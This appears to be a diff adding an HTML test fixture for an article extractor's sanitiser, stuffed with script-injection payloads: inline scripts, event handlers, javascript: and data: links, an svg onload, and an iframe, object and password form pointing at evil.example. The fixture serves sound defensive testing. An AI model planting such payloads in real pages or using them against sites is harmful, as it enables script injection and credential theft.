@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Totally Safe Article</title>
+  </head>
+  <body>
+    <article>
+      <h1>Totally Safe Article</h1>
+      <script>
+        window.__pwned = 1
+      </script>
+      <p onclick="alert('click')" style="position: fixed; top: 0">
+        This paragraph is long enough to be treated as real readable content by the extractor, and
+        it carries an inline event handler plus an inline style that must both be stripped from the
+        stored copy before it is ever rendered anywhere.
+      </p>
+      <p>
+        Another substantial paragraph follows so that the scoring algorithm keeps this block: the
+        quick brown fox jumps over the lazy dog while readers scroll down the page looking for
+        something interesting to read in the evening hours.
+      </p>
+      <img src="x" onerror="alert('img')" alt="broken" />
+      <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="data html" />
+      <p>
+        <a href="javascript:alert('link')">js link</a>
+        <a href="JaVaScRiPt:alert(2)">mixed case</a>
+        <a href="data:text/html,<script>alert(3)</script>">data link</a>
+        <a href="https://safe.example/ok">safe link</a>
+      </p>
+      <iframe src="https://evil.example/frame"></iframe>
+      <form action="https://evil.example/steal" method="post">
+        <input name="password" type="password" />
+        <button type="submit">Log in</button>
+      </form>
+      <svg onload="alert('svg')">
+        <script>
+          alert(4)
+        </script>
+      </svg>
+      <object data="https://evil.example/x.swf"></object>
+      <p>
+        A closing paragraph with enough words to make the article body comfortably longer than the
+        minimum threshold, so that the test exercises sanitisation rather than the short-content
+        failure path of the extractor.
+      </p>
+    </article>
+  </body>
+</html>
